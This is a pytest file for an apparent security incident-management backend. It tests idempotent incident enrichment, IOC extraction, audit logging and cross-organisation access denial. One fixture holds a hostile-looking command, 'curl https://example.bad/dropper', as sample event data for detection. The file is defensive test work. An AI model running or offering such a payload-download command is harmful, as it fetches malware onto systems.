from datetime import UTC, datetime

from sqlalchemy import func, select
from sqlalchemy.orm import Session

from app.models import Alert, AuditLog, Endpoint, Incident, IncidentEnrichment, SecurityEvent
from app.services.enrichment import IncidentEnrichmentService
from tests.conftest import OTHER_ORG_ID, TEST_ORG_ID


def _incident(session: Session, endpoint: Endpoint) -> Incident:
    item = Incident(
        organization_id=endpoint.organization_id,
        title="Enrichment",
        severity=7,
        priority="high",
        status="open",
        confidence=0.8,
        occurred_at=datetime(2026, 9, 1, tzinfo=UTC),
        first_seen=datetime(2026, 9, 1, tzinfo=UTC),
        last_seen=datetime(2026, 9, 1, tzinfo=UTC),
        affected_endpoint_ids=[str(endpoint.id), "malformed"],
        affected_users=["missing@example.test"],
        source_ips=["10.0.0.1"],
        destination_ips=[],
        mitre_attack=[],
        evidence={},
        timeline=[],
        sla_due_at=datetime(2026, 9, 2, tzinfo=UTC),
    )
    session.add(item)
    session.commit()
    return item


def test_internal_enrichment_is_idempotent_and_handles_missing_data(
    client, session: Session, endpoint: Endpoint
) -> None:
    incident = _incident(session, endpoint)
    event = SecurityEvent(
        organization_id=TEST_ORG_ID,
        endpoint_id=endpoint.id,
        source="wazuh",
        external_id="event-enrichment",
        event_type="process",
        severity=8,
        occurred_at=incident.occurred_at,
        raw_payload={},
        normalized_data={
            "command_line": "curl https://example.bad/dropper",
            "sha256": "a" * 64,
        },
    )
    alert = Alert(
        organization_id=TEST_ORG_ID,
        endpoint_id=endpoint.id,
        source="detection",
        external_id="alert-enrichment",
        title="Suspicious download",
        severity=8,
        occurred_at=incident.occurred_at,
        rule_id="det.suspicious_download",
        rule_version=2,
        mitre_attack=[{"id": "T1105", "name": "Ingress Tool Transfer"}],
        evidence={"url": "https://example.bad/dropper"},
    )
    alert.security_events.append(event)
    incident.alerts.append(alert)
    session.add_all([event, alert])
    session.commit()
    service = IncidentEnrichmentService(session, TEST_ORG_ID)
    result = service.enrich(incident)
    session.commit()
    count = session.scalar(select(func.count()).select_from(IncidentEnrichment))
    replay = service.enrich(incident)
    session.commit()
    assert session.scalar(select(func.count()).select_from(IncidentEnrichment)) == count
    assert result.created_count == count
    assert replay.created_count == 0
    items = client.get(f"/api/v1/incidents/{incident.id}/enrichments").json()
    assert {item["enrichment_type"] for item in items} >= {
        "assets",
        "users",
        "events",
        "detections",
        "iocs",
        "context",
    }
    assert all(item["source_type"] == "internal" for item in items)
    assert all(item["data"]["origin"] for item in items)
    iocs = next(item["data"] for item in items if item["enrichment_type"] == "iocs")
    assert iocs["domains"] == ["example.bad"]
    assert iocs["sha256"] == ["a" * 64]
    audit = session.scalar(
        select(AuditLog).where(
            AuditLog.action == "incident.enrichment.created",
            AuditLog.resource_id == str(incident.id),
        )
    )
    assert audit is not None
    assert audit.details["created_count"] == count


def test_enrichment_idor(session: Session, client: object) -> None:
    endpoint = Endpoint(
        organization_id=OTHER_ORG_ID, agent_id="other-enrich", hostname="other", status="active"
    )
    session.add(endpoint)
    session.commit()
    incident = _incident(session, endpoint)
    IncidentEnrichmentService(session, OTHER_ORG_ID).enrich(incident)
    session.commit()
    assert client.get(f"/api/v1/incidents/{incident.id}/enrichments").status_code == 404
